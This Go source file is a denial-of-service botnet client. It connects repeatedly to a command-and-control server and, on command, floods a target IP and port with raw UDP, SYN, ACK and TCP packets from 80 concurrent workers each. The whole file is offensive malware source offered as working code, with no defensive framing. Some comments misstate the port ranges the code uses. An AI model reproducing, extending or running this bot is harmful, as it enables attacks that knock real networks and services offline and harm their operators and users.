package main

import (
	"bufio"
	"context"
	"fmt"
	"math/rand"
	"net"
	"reflect"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
)

const (
	C2Address = "127.0.0.1:9090" // C2 server address and port
)

func main() {
	for {
		conn, err := net.Dial("tcp", C2Address) // Connect to C2 server
		if err != nil {
			fmt.Println("Error connecting to C2 server:", err)
			time.Sleep(5 * time.Second) // Retry after 5 seconds on connection error
			continue
		}

		fmt.Println("Connected to C2 server")
		if err := handleConnection(conn); err != nil {
			fmt.Println("Error handling connection:", err)
		}
		conn.Close()
		time.Sleep(5 * time.Second) // Wait before attempting to reconnect
	}
}

// handleConnection handles the connection to the C2 server
func handleConnection(conn net.Conn) error {
	defer conn.Close()

	// Read server responses and handle accordingly
	scanner := bufio.NewScanner(conn)
	for scanner.Scan() {
		data := scanner.Text()
		fmt.Printf("Received from server: %s\n", data) // Log data received from the server

		fields := strings.Fields(data)
		if len(fields) < 4 {
			continue // Ignore invalid commands
		}

		command := fields[0]
		targetIP := fields[1]
		targetPort := fields[2]
		durationStr := fields[3]

		duration, err := strconv.Atoi(durationStr)
		if err != nil {
			fmt.Println("Invalid duration:", err)
			continue
		}

		switch command {
		case "udpflood":
			targetPortInt, err := strconv.Atoi(targetPort)
			if err != nil {
				fmt.Println("Invalid target port:", err)
				continue
			}
			performAttack(targetIP, targetPortInt, duration, performUDPFlood)
		case "synflood":
			targetPortInt, err := strconv.Atoi(targetPort)
			if err != nil {
				fmt.Println("Invalid target port:", err)
				continue
			}
			performAttack(targetIP, targetPortInt, duration, performSYNFlood)
		case "ackflood":
			targetPortInt, err := strconv.Atoi(targetPort)
			if err != nil {
				fmt.Println("Invalid target port:", err)
				continue
			}
			performAttack(targetIP, targetPortInt, duration, performACKFlood)
		case "tcpflood":
			targetPortInt, err := strconv.Atoi(targetPort)
			if err != nil {
				fmt.Println("Invalid target port:", err)
				continue
			}
			performAttack(targetIP, targetPortInt, duration, performTCPFlood)
		default:
			fmt.Println("Unknown command:", command)
		}
	}

	if err := scanner.Err(); err != nil {
		return fmt.Errorf("error reading from connection: %w", err)
	}

	return nil
}

// performAttack is a generic function to execute a specific attack function with a fixed duration
func performAttack(targetIP string, targetPort int, duration int, attackFunc func(string, int, int) error) {
	if err := attackFunc(targetIP, targetPort, duration); err != nil {
		fmt.Printf("%s Error: %v\n", strings.ToUpper(strings.TrimSuffix(funcName(attackFunc), "Flood")), err)
	}
}

// funcName returns the name of the function as a string
func funcName(f interface{}) string {
	return runtime.FuncForPC(reflect.ValueOf(f).Pointer()).Name()
}

// performUDPFlood performs a UDP flood attack

func performUDPFlood(targetIP string, targetPort int, duration int) error {
	rand.Seed(time.Now().UnixNano())

	// Resolve target IP address
	dstIP := net.ParseIP(targetIP)
	if dstIP == nil {
		return fmt.Errorf("invalid target IP address: %s", targetIP)
	}

	// Create a context with cancellation to signal the end of the attack
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()

	// Launch multiple goroutines to send UDP packets concurrently
	numWorkers := 80 // Number of concurrent workers (adjust based on device capability)
	var wg sync.WaitGroup
	var packetCount int64 // Use int64 for atomic operations

	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()

			// Create a raw socket (AF_INET, SOCK_RAW, IPPROTO_UDP)
			conn, err := net.ListenPacket("ip4:udp", "0.0.0.0")
			if err != nil {
				fmt.Printf("Error creating raw socket: %v\n", err)
				return
			}
			defer conn.Close()

			for {
				select {
				case <-ctx.Done():
					return // Terminate goroutine if context is canceled
				default:
					// Prepare UDP packet
					udpLayer := &layers.UDP{
						SrcPort: layers.UDPPort(rand.Intn(65535)), // Randomize source port
						DstPort: layers.UDPPort(targetPort),
					}

					// Create a random payload of appropriate length (e.g., 16 bytes)
					payloadSize := 16
					payload := make([]byte, payloadSize)
					rand.Read(payload)

					// Serialize UDP layer with payload
					buffer := gopacket.NewSerializeBuffer()
					opts := gopacket.SerializeOptions{}
					if err := udpLayer.SerializeTo(buffer, opts); err != nil {
						fmt.Printf("Error serializing UDP layer: %v\n", err)
						continue
					}
					if err := gopacket.SerializeLayers(buffer, opts, gopacket.Payload(payload)); err != nil {
						fmt.Printf("Error serializing payload: %v\n", err)
						continue
					}

					// Send the raw packet (UDP) to the target
					if _, err := conn.WriteTo(buffer.Bytes(), &net.IPAddr{IP: dstIP}); err != nil {
						continue
					}

					atomic.AddInt64(&packetCount, 1) // Increment packet count atomically
				}
			}
		}()
	}

	// Wait for all goroutines to finish or until the context is canceled
	wg.Wait()

	fmt.Printf("UDP flood attack completed. Sent %d packets.\n", atomic.LoadInt64(&packetCount))
	return nil
}



// performSYNFlood performs a SYN flood attack
func performSYNFlood(targetIP string, targetPort int, duration int) error {
	rand.Seed(time.Now().UnixNano())

	// Resolve target IP address
	dstIP := net.ParseIP(targetIP)
	if dstIP == nil {
		return fmt.Errorf("invalid target IP address: %s", targetIP)
	}

	// Prepare TCP SYN packet layers
	var packetCount int64 // Use int64 for atomic operations

	// Create a WaitGroup to wait for all goroutines to finish
	var wg sync.WaitGroup

	// Create a context with cancellation to signal the end of the attack
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()

	// Launch multiple goroutines to send SYN packets concurrently
	numWorkers := 80 // Number of concurrent workers (adjust based on device capability)
	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()

			// Create raw socket (AF_INET, SOCK_RAW, IPPROTO_TCP)
			conn, err := net.ListenPacket("ip4:tcp", "0.0.0.0")
			if err != nil {
				fmt.Printf("Error creating raw socket: %v\n", err)
				return
			}
			defer conn.Close()

			for {
				select {
				case <-ctx.Done(): // Check if the context is canceled
					return // Terminate goroutine if context is canceled
				default:
					// Prepare TCP SYN packet
					tcpLayer := &layers.TCP{
						SrcPort:    layers.TCPPort(rand.Intn(52024) + 1024), // Randomize source port (32768-65535)
						DstPort:    layers.TCPPort(targetPort),
						SYN:        true,                          // SYN flag to initiate TCP connection
						Seq:        rand.Uint32(),                 // Randomize sequence number
						Window:     12800,                         // TCP window size (can be any valid value)
						DataOffset: 5,                            // DataOffset is set to 5 (minimum value)
					}

					// Serialize TCP layer into buffer
					buffer := gopacket.NewSerializeBuffer()
					if err := gopacket.SerializeLayers(buffer, gopacket.SerializeOptions{}, tcpLayer); err != nil {
						fmt.Printf("Error crafting TCP SYN packet: %v\n", err)
						continue
					}

					// Get packet data bytes
					packetData := buffer.Bytes()

					// Send raw packet (TCP SYN) to the target
					if _, err := conn.WriteTo(packetData, &net.IPAddr{IP: dstIP}); err != nil {
						continue
					}

					atomic.AddInt64(&packetCount, 1) // Increment packet count atomically
				}
			}
		}()
	}

	// Wait for all goroutines to finish or until the context is canceled
	wg.Wait()

	fmt.Printf("SYN flood attack completed.\n")
	return nil
}


// performACKFlood performs an ACK flood attack
func performACKFlood(targetIP string, targetPort int, duration int) error {
	rand.Seed(time.Now().UnixNano())

	// Resolve target IP address
	dstIP := net.ParseIP(targetIP)
	if dstIP == nil {
		return fmt.Errorf("invalid target IP address: %s", targetIP)
	}

	// Prepare TCP ACK packet layers
	var packetCount int64 // Use int64 for atomic operations

	// Create a WaitGroup to wait for all goroutines to finish
	var wg sync.WaitGroup

	// Create a context with cancellation to signal the end of the attack
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()

	// Launch multiple goroutines to send ACK packets concurrently
	numWorkers := 80 // Number of concurrent workers (adjust based on device capability)
	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()

			// Create raw socket (AF_INET, SOCK_RAW, IPPROTO_TCP)
			conn, err := net.ListenPacket("ip4:tcp", "0.0.0.0")
			if err != nil {
				fmt.Printf("Error creating raw socket: %v\n", err)
				return
			}
			defer conn.Close()

			for {
				select {
				case <-ctx.Done(): // Check if the context is canceled
					return // Terminate goroutine if context is canceled
				default:
					// Prepare TCP ACK packet
					tcpLayer := &layers.TCP{
						SrcPort:    layers.TCPPort(rand.Intn(64312) + 1024), // Randomize source port (1024-65335)
						DstPort:    layers.TCPPort(targetPort),
						ACK:        true,                          // ACK flag to acknowledge data
						Seq:        rand.Uint32(),                 // Randomize sequence number
						Ack:        rand.Uint32(),                 // Randomize acknowledgment number
						Window:     12800,                         // TCP window size (can be any valid value)
						DataOffset: 5,                            // Set DataOffset to 5 (20-byte TCP header)
					}

					// Serialize TCP layer into buffer
					buffer := gopacket.NewSerializeBuffer()
					if err := gopacket.SerializeLayers(buffer, gopacket.SerializeOptions{}, tcpLayer); err != nil {
						fmt.Printf("Error crafting TCP ACK packet: %v\n", err)
						continue
					}

					// Get packet data bytes
					packetData := buffer.Bytes()

					// Send raw packet (TCP ACK) to the target
					if _, err := conn.WriteTo(packetData, &net.IPAddr{IP: dstIP}); err != nil {
						continue
					}

					atomic.AddInt64(&packetCount, 1) // Increment packet count atomically
				}
			}
		}()
	}

	// Wait for all goroutines to finish or until the context is canceled
	wg.Wait()

	fmt.Printf("ACK flood attack completed. Sent %d packets.\n", atomic.LoadInt64(&packetCount))
	return nil
}

// performTCPFlood performs a TCP flood attack
func performTCPFlood(targetIP string, targetPort int, duration int) error {
	rand.Seed(time.Now().UnixNano())

	// Resolve target IP address
	dstIP := net.ParseIP(targetIP)
	if dstIP == nil {
		return fmt.Errorf("invalid target IP address: %s", targetIP)
	}

	// Prepare TCP packet layers
	var packetCount int64 // Use int64 for atomic operations

	// Create a WaitGroup to wait for all goroutines to finish
	var wg sync.WaitGroup

	// Create a context with cancellation to signal the end of the attack
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()

	// Launch multiple goroutines to send TCP packets concurrently
	numWorkers := 80 // Number of concurrent workers (adjust based on device capability)
	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()

			// Create raw socket (AF_INET, SOCK_RAW, IPPROTO_TCP)
			conn, err := net.ListenPacket("ip4:tcp", "0.0.0.0")
			if err != nil {
				fmt.Printf("Error creating raw socket: %v\n", err)
				return
			}
			defer conn.Close()

			for {
				select {
				case <-ctx.Done(): // Check if the context is canceled
					return // Terminate goroutine if context is canceled
				default:
					// Prepare TCP packet
					tcpLayer := &layers.TCP{
						SrcPort:    layers.TCPPort(rand.Intn(52024) + 1024), // Randomize source port (32768-65535)
						DstPort:    layers.TCPPort(targetPort),
						Seq:        rand.Uint32(),                 // Randomize sequence number
						Window:     12800,                         // TCP window size (can be any valid value)
						SYN:        true,                          // Set SYN flag for TCP handshake
						DataOffset: 5,                            // Set DataOffset to 5 (20-byte TCP header)
					}

					// Serialize TCP layer into buffer
					buffer := gopacket.NewSerializeBuffer()
					if err := gopacket.SerializeLayers(buffer, gopacket.SerializeOptions{}, tcpLayer); err != nil {
						fmt.Printf("Error crafting TCP packet: %v\n", err)
						continue
					}

					// Get packet data bytes
					packetData := buffer.Bytes()

					// Send raw packet (TCP) to the target
					if _, err := conn.WriteTo(packetData, &net.IPAddr{IP: dstIP}); err != nil {
						continue
					}

					atomic.AddInt64(&packetCount, 1) // Increment packet count atomically
				}
			}
		}()
	}

	// Wait for all goroutines to finish or until the context is canceled
	wg.Wait()

	fmt.Printf("TCP flood attack completed.\n")
	return nil
}
